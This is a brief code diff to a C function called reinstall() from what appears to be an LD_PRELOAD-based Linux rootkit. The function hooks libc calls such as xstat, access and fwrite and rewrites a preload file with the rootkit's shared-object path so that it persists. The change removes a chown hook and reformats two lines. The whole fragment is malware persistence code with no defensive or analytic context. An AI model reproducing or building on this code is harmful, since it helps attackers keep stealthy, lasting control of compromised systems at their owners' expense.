@@ -2,7 +2,6 @@ void reinstall(void)
 {   
     HOOK(o_xstat, C__XSTAT);
     HOOK(o_access, CACCESS);
-    HOOK(o_chown,CCHOWN);
 
     FILE *preload;
     struct stat s_fstat;
@@ -17,7 +16,8 @@ void reinstall(void)
         {
             HOOK(o_fwrite,CFWRITE);
             o_fwrite(sopath, strlen(sopath), 1, preload);
-            fflush(preload); fclose(preload);
+            fflush(preload);
+            fclose(preload);
         }
     }
     CLEAN(sopath);
